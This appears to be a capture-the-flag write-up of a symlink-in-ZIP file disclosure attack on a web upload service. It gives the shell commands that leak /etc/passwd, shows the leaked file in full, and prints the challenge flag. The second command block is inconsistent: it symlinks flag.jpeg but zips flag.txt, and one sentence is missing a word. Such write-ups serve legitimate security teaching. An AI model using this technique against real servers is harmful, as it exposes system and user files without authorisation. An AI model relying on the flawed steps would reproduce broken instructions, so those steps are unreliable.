To get the flag, you had to exploit a vulnerability that results from improper handling of symlink files. If a symlink file points to an existing file in the web server, the contents of that file will be shown to the user.

The challenge description states that the flag is located in a user's home directory. However, we don't know the name of the user who's directory we need to access. To find out the username, you would have to look at the */etc/passwd* file. To do this, the following commands are used (The symlink file extension doesn't really matter):
```
ln -s /etc/passwd pass.txt
zip --symlinks pass.zip pass.txt
```

The resulting ZIP file would then be sent through the web interface, giving you the following output:
```
---------------pass.txt---------------

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
copenhagen:x:1000:1000::/home/copenhagen:/bin/sh
```

It can be noticed that there is only one user, *copenhagen*. With this information, it can be deduced that the path to the  is */home/copenhagen/flag.txt*. Therefore, the following commands can be used (You may need higher privileges to run these commands):
```
cd /home
mkdir copenhagen
cd copenhagen
touch flag.txt
ln -s /home/copenhagen/flag.txt flag.jpeg
zip --symlinks flag.zip flag.txt
```

By uploading the resulting ZIP file, the following flag can be retrieved:

utflag{No_Observable_Cats_Were_Harmed}


\* Note: Doing this through Windows or WSL does not seem to work. I assume that it is due to how Windows implements symbolic links, but your guess is as good as mine.